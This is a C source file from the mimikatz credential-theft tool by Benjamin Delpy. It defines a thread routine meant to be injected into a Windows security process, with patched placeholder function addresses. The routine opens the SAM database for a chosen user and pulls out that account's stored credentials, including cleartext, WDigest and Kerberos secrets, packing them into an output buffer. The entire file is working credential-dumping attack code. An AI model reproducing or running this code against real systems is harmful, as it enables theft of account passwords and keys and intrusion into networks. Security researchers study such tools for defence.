/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_lsadump_remote.h"

#pragma optimize("", off)
DWORD WINAPI kuhl_sekurlsa_samsrv_thread(PREMOTE_LIB_FUNC lpParameter)
{
	SAMPR_HANDLE hSam, hDomain, hUser;
	PPOLICY_ACCOUNT_DOMAIN_INFO pPolicyDomainInfo;
	DWORD i, credSize = 0;
	LSA_SUPCREDENTIALS_BUFFERS buffers[5];
	
	DWORD kn[][10] = {
		{0x004C0043, 0x00410045, 0x00540052, 0x00580045, 0x00000054}, // CLEARTEXT
		{0x00440057, 0x00670069, 0x00730065, 0x00000074}, // WDigest
		{0x0065004b, 0x00620072, 0x00720065, 0x0073006f, 0x00000000}, // Kerberos
		{0x0065004b, 0x00620072, 0x00720065, 0x0073006f, 0x004e002d, 0x00770065, 0x00720065, 0x004b002d, 0x00790065,0x00000073}, //
		};
	UNICODE_STRING knu[] = {
		{18, 18, (PWSTR) kn[0]},
		{14, 14, (PWSTR) kn[1]},
		{16, 16, (PWSTR) kn[2]},
		{38, 38, (PWSTR) kn[3]},
	};

	if(NT_SUCCESS(((PSAMICONNECT) 0x4141414141414141)(NULL, &hSam, 0x10000000, TRUE)))
	{
		if(NT_SUCCESS(((PLSAIQUERYINFORMATIONPOLICYTRUSTED) 0x4848484848484848)(PolicyAccountDomainInformation, (PVOID *)(&pPolicyDomainInfo))))
		{
			if(NT_SUCCESS(((PSAMROPENDOMAIN) 0x4444444444444444)(hSam, 0x10000000, pPolicyDomainInfo->DomainSid, &hDomain)))
			{
				if(NT_SUCCESS(((PSAMROPENUSER) 0x4545454545454545)(hDomain, 0x10000000, *(PDWORD) lpParameter->inputData, &hUser)))
				{
					for(i = 0; i < 5; i++)
					{
						buffers[i].Buffer = NULL;
						buffers[i].credential.size = 0;
						buffers[i].credential.type = i;
						buffers[i].status = STATUS_ABANDONED;

						if(i)
							buffers[i].status = ((PSAMIRETRIEVEPRIMARYCREDENTIALS) 0x4343434343434343)(hUser, &knu[i-1], &buffers[i].Buffer, &buffers[i].credential.size);
						else
						{
							buffers[i].credential.size = sizeof(SAMPR_USER_INTERNAL1_INFORMATION);
							buffers[i].status = ((PSAMRQUERYINFORMATIONUSER) 0x4646464646464646)(hUser, UserInternal1Information, (PSAMPR_USER_INFO_BUFFER *) &buffers[i].Buffer);
						}
						if(NT_SUCCESS(buffers[i].status) && buffers[i].Buffer && buffers[i].credential.size)
							credSize += buffers[i].credential.size;
					}

					lpParameter->outputSize = sizeof(LSA_SUPCREDENTIALS) + (5 * sizeof(LSA_SUPCREDENTIAL)) + credSize;
					if(lpParameter->outputData = ((PVIRTUALALLOC) 0x4a4a4a4a4a4a4a4a)(NULL, lpParameter->outputSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
					{
						credSize = 0;
						((PLSA_SUPCREDENTIALS) lpParameter->outputData)->count = 5;
						for(i = 0; i < 5; i++)
						{
							if(NT_SUCCESS(buffers[i].status))
							{
								if(buffers[i].Buffer && buffers[i].credential.size)
								{
									buffers[i].credential.offset = sizeof(LSA_SUPCREDENTIALS) + (5 * sizeof(LSA_SUPCREDENTIAL)) + credSize;
									((PLSA_SUPCREDENTIAL) ((PBYTE) lpParameter->outputData + sizeof(LSA_SUPCREDENTIALS)))[i] = buffers[i].credential;
									((PMEMCPY) 0x4c4c4c4c4c4c4c4c)((PBYTE) lpParameter->outputData + buffers[i].credential.offset, buffers[i].Buffer, buffers[i].credential.size);
									credSize += buffers[i].credential.size;
								}
								if(i)
									((PLOCALFREE) 0x4b4b4b4b4b4b4b4b)(buffers[i].Buffer);
								else
									((PSAMIFREE_SAMPR_USER_INFO_BUFFER) 0x4747474747474747)((PSAMPR_USER_INFO_BUFFER) buffers[i].Buffer, UserInternal1Information);
							}
						}
					}
					((PSAMRCLOSEHANDLE) 0x4242424242424242)(&hUser);
				}
				((PSAMRCLOSEHANDLE) 0x4242424242424242)(&hDomain);
			}
			((PLSAIFREE_LSAPR_POLICY_INFORMATION) 0x4949494949494949)(PolicyAccountDomainInformation, pPolicyDomainInfo);
		}
		((PSAMRCLOSEHANDLE) 0x4242424242424242)(&hSam);
	}
	return STATUS_SUCCESS;
}
DWORD kuhl_sekurlsa_samsrv_thread_end(){return 'lsar';}
#pragma optimize("", on)